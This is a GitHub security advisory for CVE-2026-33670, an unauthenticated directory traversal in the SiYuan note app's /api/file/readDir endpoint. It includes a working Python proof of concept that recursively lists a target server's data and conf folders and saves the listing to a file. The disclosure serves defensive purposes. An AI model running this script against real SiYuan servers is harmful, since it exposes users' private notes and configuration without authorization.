# [C] SiYuan has directory traversal within its publishing service

## Summary
Severity: Critical
Advisory: GHSA-xmw9-6r43-x9ww
CVE: CVE-2026-33670
CWE: CWE-22
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-25
Source: https://github.com/advisories/GHSA-xmw9-6r43-x9ww
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0

## Details
### Details

The /api/file/readDir interface was used to traverse and retrieve the file names of all documents under a notebook.

### PoC

```python
#!/usr/bin/env python3
"""POC: SiYuan /api/file/readDir 未鉴权目录遍历"""
import requests, json, sys

def poc(target):
    base = target.rstrip("/")
    url = f"{base}/api/file/readDir"

    def read_dir(path, depth=0, max_depth=4):
        try:
            r = requests.post(url, json={"path":path},
                            headers={"Content-Type":"application/json"}, timeout=10)
            data = r.json()
        except Exception as e:
            return
        if data.get("code") != 0:
            return

        entries = data.get("data") or []
        for entry in entries:
            name = entry.get("name","")
            if name.startswith("."):
                continue
            icon = "📁" if entry.get("isDir") else "📄"
            indent = "  " * depth
            print(f"  {indent}{icon} {name}")

            if entry.get("isDir") and depth < max_depth:
                read_dir(f"{path}/{name}", depth+1, max_depth)

    # 遍历根目录
    print("[+] 漏洞存在！开始遍历\n")
    print("  📂 data/")
    read_dir("data", max_depth=2)

    print("\n  📂 conf/")
    read_dir("conf", max_depth=2)

    # 保存
    try:
        r = requests.post(url, json={"path":"data"},
                        headers={"Content-Type":"application/json"}, timeout=10)
        with open("readdir.json","w",encoding="utf-8") as f:
            json.dump(r.json(), f, ensure_ascii=False, indent=2)
        print(f"\n[+] 根目录数据已保存: readdir.json")
    except: pass

if __name__ == "__main__":
    poc(sys.argv[1] if len(sys.argv)>1 else "http://172.18.40.184")
```

### Impact

Directory traversal vulnerability: The entire directory structure of a notebook could be obtained, and then a file reading vulnerability could be exploited to achieve arbitrary document reading.

资源文件夹

<img width="943" height="794" alt="image" src="https://github.com/user-attachments/assets/c97fcc42-183e-4c83-8a27-cf99bf805038" />

插件文件夹

<img width="826" height="921" alt="image" src="https://github.com/user-attachments/assets/925d4512-e4c0-4b3b-bf96-5639ec572705" />

conf文件夹

<img width="730" height="834" alt="image" src="https://github.com/user-attachments/assets/2a0c23b9-2d87-4421-977d-687f47726741" />

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-xmw9-6r43-x9ww
- https://nvd.nist.gov/vuln/detail/CVE-2026-33670
- https://github.com/siyuan-note/siyuan
